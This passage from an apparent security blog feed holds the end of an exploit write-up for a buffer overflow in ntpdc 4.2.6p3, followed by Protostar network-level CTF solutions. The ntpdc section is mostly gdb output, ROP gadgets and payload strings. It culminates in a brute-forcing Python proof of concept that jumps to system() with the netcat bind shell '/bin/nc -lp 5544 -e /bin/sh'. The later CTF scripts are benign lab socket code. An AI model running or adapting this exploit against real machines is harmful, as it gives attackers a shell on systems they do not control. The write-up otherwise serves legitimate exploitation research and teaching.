</span><span class='line'>***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAͩ����h����hp�ȷh0�ɷ�' unknown
</span><span class='line'>[New process 4396]
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
</span><span class='line'>process 4396 is executing new program: /bin/dash
</span><span class='line'>[New process 4397]
</span><span class='line'>process 4397 is executing new program: /bin/nc.traditional</span></code></pre></td></tr></table></div></figure>


<p>This uses a simple <code>system</code> payload with hard-coded addresses, because at this point it&rsquo;s an old-school, CTF-style exploit.  And it works.  With this trivial PoC working, I decided to check another box I had to verify this is a common distribution method.  An Ubuntu VM said otherwise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ uname -a
</span><span class='line'>Linux bryan-VirtualBox 3.2.0-74-generic #109-Ubuntu SMP Tue Dec 9 16:47:54 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'>$ ./checksec.sh --file /usr/bin/ntpdc
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /usr/bin/ntpdc
</span><span class='line'>$ cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>Quite a different story.  We need to bypass full RELRO (no GOT overwrites), PIE+ASLR, NX, SSP, and ASCII armor.  In our current state, things are looking pretty grim.  As an aside, it&rsquo;s important to remember that because this is a local exploit, the attacker is assumed to have limited control over the system.  Ergo, an attacker may inspect and modify the system in the same manner a limited user could.  This becomes important with a few techniques we&rsquo;re going to use moving forward.</p>

<p>Our first priority is stack pivoting; we won&rsquo;t be able to ROP to victory without control over the stack.  There are a few options for this, but the easiest option is likely going to be an <code>ADD ESP, ?</code> gadget.  The problem with this being that we need to have some sort of control over the stack or be able to modify ESP somewhere into BSS that we control.  Looking at the output of <code>ropgadget</code>, we&rsquo;ve got 36 options, almost all of which are of the form <code>ADD ESP, ?</code>.</p>

<p>After looking through the list, I determined that none of the values led to control over the stack; in fact, nothing I injected landed on the stack.  I did note, however, the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/6i 0x800143e0
</span><span class='line'>   0x800143e0: add    esp,0x256c
</span><span class='line'>   0x800143e6: pop    ebx
</span><span class='line'>   0x800143e7: pop    esi
</span><span class='line'>   0x800143e8: pop    edi
</span><span class='line'>   0x800143e9: pop    ebp
</span><span class='line'>   0x800143ea: ret 
</span><span class='line'>gdb-peda$ x/30s $esp+0x256c
</span><span class='line'>0xbffff3a4:  "-1420310755.557158-104120677"
</span><span class='line'>0xbffff3c1:  "WINDOWID=69206020"
</span><span class='line'>0xbffff3d3:  "GNOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM"
</span><span class='line'>0xbffff3fd:  "GTK_MODULES=canberra-gtk-module:canberra-gtk-module"</span></code></pre></td></tr></table></div></figure>


<p>These are environmental variables passed into the application and located on the program stack.  Using the ROP gadget <code>ADD ESP, 0x256c</code>, followed by a series of register POPs, we could land here.  Controlling this is easy with the help of LD_PRELOAD, a neat trick <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">documented</a> by Dan Rosenberg in 2010.  By exporting LD_PRELOAD, we can control uninitialized data located on the stack, as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*10000'`
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>[..snip..]
</span><span class='line'>gdb-peda$ x/10wx $esp+0x256c
</span><span class='line'>0xbfffedc8: 0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xbfffedd8: 0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xbfffede8: 0x41414141  0x41414141
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>Using some pattern_create/offset magic, we can find the offset in our LD_PRELOAD string and take control over EIP and the stack:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*8490 + "AAAA" + "BBBB"'`
</span><span class='line'>$ python -c "print 'A'*485 + '\xe0\x43\x01\x80' + 'A'*79 + '\x8d\x67\x02\x80' + 'B'*600" &gt; input.file
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0x41414141 ('AAAA')
</span><span class='line'>ECX: 0x13560 
</span><span class='line'>EDX: 0x42424242 ('BBBB')
</span><span class='line'>ESI: 0x41414141 ('AAAA')
</span><span class='line'>EDI: 0x41414141 ('AAAA')
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbffff3bc ("BBBB")
</span><span class='line'>EIP: 0x41414141 ('AAAA')
</span><span class='line'>EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41414141
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3bc ("BBBB")
</span><span class='line'>0004| 0xbffff3c0 --&gt; 0x4e495700 ('')
</span><span class='line'>0008| 0xbffff3c4 ("DOWID=69206020")
</span><span class='line'>0012| 0xbffff3c8 ("D=69206020")
</span><span class='line'>0016| 0xbffff3cc ("206020")
</span><span class='line'>0020| 0xbffff3d0 --&gt; 0x47003032 ('20')
</span><span class='line'>0024| 0xbffff3d4 ("NOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
</span><span class='line'>0028| 0xbffff3d8 ("_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>This gives us EIP, control over the stack, and control over a decent number of registers; however, the LD_PRELOAD trick is extremely sensitive to stack shifting which represents a pretty big problem for exploit portability.  For now, I&rsquo;m going to forget about it; chances are we could brute force the offset, if necessary, or simply invoke the application with <code>env -i</code>.</p>

<p>From here, we need to figure out a ROP payload.  The easiest payload I can think of is a simple ret2libc.  Unfortunately, ASCII armor null bytes all of them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ vmmap
</span><span class='line'>
</span><span class='line'>0x00327000 0x004cb000 r-xp /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>0x004cb000 0x004cd000 r--p /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>0x004cd000 0x004ce000 rw-p /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0x366060 &lt;system&gt;
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>One idea I had was to simply construct the address in memory, then call it.  Using <a href="http://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>, I hunted for ADD/SUB instructions that modified any registers we controlled.  Eventually, I discovered this gem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x800138f2: add edi, esi; ret 0;
</span><span class='line'>0x80022073: call edi</span></code></pre></td></tr></table></div></figure>


<p>Using the above, we could pop controlled, non-null values into EDI/ESI, that when added equaled <code>0x366060 &lt;system&gt;</code>.  Many values will work, but I chose <code>0xeeffffff + 0x11366061</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0x41414141 ('AAAA')
</span><span class='line'>ECX: 0x12f00 
</span><span class='line'>EDX: 0x42424242 ('BBBB')
</span><span class='line'>ESI: 0xeeffffff 
</span><span class='line'>EDI: 0x11366061 
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
</span><span class='line'>EIP: 0x800143ea (ret)
</span><span class='line'>EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x800143e7: pop    esi
</span><span class='line'>   0x800143e8: pop    edi
</span><span class='line'>   0x800143e9: pop    ebp
</span><span class='line'>=&gt; 0x800143ea: ret    
</span><span class='line'>   0x800143eb: nop
</span><span class='line'>   0x800143ec: lea    esi,[esi+eiz*1+0x0]
</span><span class='line'>   0x800143f0: mov    DWORD PTR [esp],ebp
</span><span class='line'>   0x800143f3: call   0x80018d20
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
</span><span class='line'>0004| 0xbfffefbc --&gt; 0x80022073 --&gt; 0xd7ff 
</span><span class='line'>0008| 0xbfffefc0 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0012| 0xbfffefc4 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0016| 0xbfffefc8 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0020| 0xbfffefcc ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0024| 0xbfffefd0 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbfffefd4 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>0x800143ea in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>As shown above, we&rsquo;ve got our two values in EDI/ESI and are returning to our <code>ADD EDI, ESI</code> gadget.  Once this completes, we return to our <code>CALL EDI</code> gadget, which will jump into <code>system</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EDI: 0x366060 (&lt;system&gt;:   sub    esp,0x1c)
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbfffefc0 --&gt; 0xbffff60d ("/bin/nc -lp 5544 -e /bin/sh")
</span><span class='line'>EIP: 0x80022073 --&gt; 0xd7ff
</span><span class='line'>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>=&gt; 0x80022073: call   edi</span></code></pre></td></tr></table></div></figure>


<p>Recall the format of a ret2libc: <code>[system() address | exit() | shell command]</code>; therefore, we need to stick a bogus <code>exit</code> address (in my case, junk) as well as the address of a command.  Also remember, however, that <code>CALL EDI</code> is essentially a macro for <code>PUSH EIP+2 ; JMP EDI</code>.  This means that our stack will be tainted with the address @ EIP+2.  Thanks to this, we don&rsquo;t really need to add an exit address, as one will be added for us.  There are, unfortunately, no <code>JMP EDI</code> gadgets in the binary, so we&rsquo;re stuck with a messy exit.</p>

<p>This culminates in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*8472 + "\xff\xff\xff\xee" + "\x61\x60\x36\x11" + "AAAA" + "\xf2\x38\x01\x80" + "\x73\x20\x02\x80" + "\x0d\xf6\xff\xbf" + "C"*1492'`
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>[snip all the LD_PRELOAD crap]
</span><span class='line'>[New process 31184]
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
</span><span class='line'>process 31184 is executing new program: /bin/dash
</span><span class='line'>[New process 31185]
</span><span class='line'>process 31185 is executing new program: /bin/nc.traditional</span></code></pre></td></tr></table></div></figure>


<p>Success!  Though this is a very dirty hack, and makes no claim of portability, it works.  As noted previously, we can brute force the image base and stack offsets, though we can also execute the binary with an empty environment and no stack tampering with <code>env -i</code>, giving us a much higher chance of hitting our mark.</p>

<p>Overall, this was quite a bit of fun.  Although ASLR/PIE still poses an issue, this is a local bug that brute forcing and a little investigation can&rsquo;t take care of.  NX/RELRO/Canary/SSP/ASCII Armor have all been successfully neutralized.  I hacked up a PoC that <em>should</em> work on Ubuntu boxes as configured, but it brute forces offsets.  Test runs show it can take up to 2 hours to successfully pop a box.  Full code can be found below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from os import system, environ
</span><span class='line'>from struct import pack
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># ntpdc 4.2.6p3 bof
</span><span class='line'># @dronesec
</span><span class='line'># tested on x86 Ubuntu 12.04.5 LTS
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>IMAGE_BASE = 0x80000000
</span><span class='line'>LD_INITIAL_OFFSET = 8900
</span><span class='line'>LD_TAIL_OFFSET = 1400
</span><span class='line'>
</span><span class='line'>sploit = "\x41" * 485        # junk 
</span><span class='line'>sploit += pack("&lt;I", IMAGE_BASE + 0x000143e0) # eip
</span><span class='line'>sploit += "\x41" * 79        # junk 
</span><span class='line'>sploit += pack("&lt;I", IMAGE_BASE + 0x0002678d) # location -0x14/-0x318 from shellcode
</span><span class='line'>
</span><span class='line'>ld_pl = ""
</span><span class='line'>ld_pl += pack("&lt;I", 0xeeffffff) # ESI
</span><span class='line'>ld_pl += pack("&lt;I", 0x11366061) # EDI
</span><span class='line'>ld_pl += pack("&lt;I", 0x41414141) # EBP
</span><span class='line'>ld_pl += pack("&lt;I", IMAGE_BASE + 0x000138f2) # ADD EDI, ESI; RET
</span><span class='line'>ld_pl += pack("&lt;I", IMAGE_BASE + 0x00022073) # CALL EDI
</span><span class='line'>ld_pl += pack("&lt;I", 0xbffff60d) # payload addr based on empty env; probably wrong
</span><span class='line'>
</span><span class='line'>environ["EGG"] = "/bin/nc -lp 5544 -e /bin/sh"
</span><span class='line'>
</span><span class='line'>for idx in xrange(200):
</span><span class='line'>
</span><span class='line'>    for inc in xrange(200):
</span><span class='line'>
</span><span class='line'>        ld_pl = ld_pl + "\x41" * (LD_INITIAL_OFFSET + idx)
</span><span class='line'>        ld_pl += "\x43" * (LD_INITIAL_OFFSET + inc)
</span><span class='line'>
</span><span class='line'>        environ["LD_PRELOAD"] = ld_pl
</span><span class='line'>        system("echo %s | ntpdc 2&gt;&1" % sploit)</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Network]]></title>
    <link href="http://hatRiot.github.io/blog/2014/11/23/protostar-network/"/>
    <updated>2014-11-23T13:10:04-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/11/23/protostar-network</id>
    <content type="html"><![CDATA[<p>Previous posts:</p>

<p><a href="http://hatriot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/">Protostar &ndash; Stack</a><br/>
<a href="http://hatriot.github.io/blog/2014/09/16/protostar-format-strings/">Protostar &ndash; Format String</a><br/>
<a href="http://hatriot.github.io/blog/2014/09/21/protostar-heap-exploits/">Protostar &ndash; Heap</a></p>

<p>The network stages were pretty simple and emphasized more on data representation, rather than remote exploitation.</p>

<h2>Network 00</h2>

<p>The network levels all have binaries running on the system on various ports.  The first level runs on port 2999.  We can attach to the process with gdb and send over some junk data:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># echo "xxxx" | nc 192.168.1.106 2999
</span><span class='line'>Please send '652467094' as a little endian 32bit int
</span><span class='line'>I'm sorry, you sent 2021161080 instead</span></code></pre></td></tr></table></div></figure>


<p>Looking at the <a href="https://exploit-exercises.com/protostar/net0/">source code</a>, we want to send a string that, when cast to an unsigned integer, equals some random value.  To do this, we simply open up a socket to the listener, read in the number, transform it to little endian, and send it back.  Using a bit of Python-fu we quickly arrive at a solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>import struct
</span><span class='line'>import sys
</span><span class='line'>from re import findall
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    sock = socket.socket()
</span><span class='line'>    sock.connect(('192.168.1.106', 2999))
</span><span class='line'>
</span><span class='line'>    data = sock.recv(256)
</span><span class='line'>
</span><span class='line'>    m = findall("Please send '(.*?)' as", data)
</span><span class='line'>    if len(m) &gt; 0:
</span><span class='line'>        m = int(m[0])
</span><span class='line'>    else:
</span><span class='line'>        print 'No data received?'
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    print 'Swapping %s to little endian 32bit int' % m
</span><span class='line'>    swapped = struct.pack('&lt;Q', m)
</span><span class='line'>
</span><span class='line'>    print 'Swapped to %s' % repr(swapped)
</span><span class='line'>    sock.sendall(str(swapped))
</span><span class='line'>
</span><span class='line'>    data = sock.recv(512)
</span><span class='line'>    print data
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span><span class='line'>finally:
</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>


<p>And when ran:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net0.py 
</span><span class='line'>Swapping 1295208340 to little endian 32bit int
</span><span class='line'>Swapped to '\x94O3M\x00\x00\x00\x00'
</span><span class='line'>Thank you sir/madam</span></code></pre></td></tr></table></div></figure>


<h2>Network 01</h2>

<p>This stage simply requires us to unpack an unsigned integer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> unsigned int wanted;
</span><span class='line'>
</span><span class='line'>  wanted = random();
</span><span class='line'>
</span><span class='line'>  sprintf(fub, "%d", wanted);
</span><span class='line'>
</span><span class='line'>  if(write(0, &wanted, sizeof(wanted)) != sizeof(wanted)) {
</span><span class='line'>      errx(1, ":(\n");
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>Trivially accomplished with some struct packing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>import struct
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    sock = socket.socket()
</span><span class='line'>    sock.connect(('192.168.1.106', 2998))
</span><span class='line'>
</span><span class='line'>    data = sock.recv(256)
</span><span class='line'>
</span><span class='line'>    swapped = str(struct.unpack('&lt;I', data)[0])
</span><span class='line'>    print swapped
</span><span class='line'>    sock.sendall(swapped + '\r\n')
</span><span class='line'>    print sock.recv(256)
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span><span class='line'>finally:
</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>


<p>Which gives us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net1.py 
</span><span class='line'>1413209085
</span><span class='line'>you correctly sent the data</span></code></pre></td></tr></table></div></figure>


<h2>Network 02</h2>

<p>The third network level tasks us with reading in 4 unsigned integers, adding them together, and sending back the result.  The &ldquo;trick&rdquo; in this stage, if you will, is that uint32 arithmetic needs to take into account wrapping.  To accomplish this, we want our result to never be negative, which requires us to define the result modulo 2<sup>n</sup>, where n = bit length.</p>

<p>This makes for a pretty simple stage:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import struct
</span><span class='line'>import socket
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    sock = socket.socket()
</span><span class='line'>    sock.connect(('192.168.1.106', 2997))
</span><span class='line'>
</span><span class='line'>    # read in our four numbers
</span><span class='line'>    total = 0
</span><span class='line'>    for i in xrange(4):
</span><span class='line'>        n = sock.recv(4)
</span><span class='line'>        n = struct.unpack('&lt;I', n)[0]
</span><span class='line'>        print 'Read digit %d' % n
</span><span class='line'>        total += n
</span><span class='line'>
</span><span class='line'>    total = total & 0xffffffffL
</span><span class='line'>    total = struct.pack('&lt;I', total)
</span><span class='line'>    sock.sendall(total)
</span><span class='line'>    print sock.recv(256)
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span><span class='line'>finally:
</span><span class='line'>    sock.close()</span></code></pre></td></tr></table></div></figure>


<p>Note that we AND the final result by 2<sup>n</sup>, ensuring we have a positive 32 bit value.</p>

<p>When run:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># python protostar_net2.py 
</span><span class='line'>Read digit 1533721612
</span><span class='line'>Read digit 363484815
</span><span class='line'>Read digit 1200915436
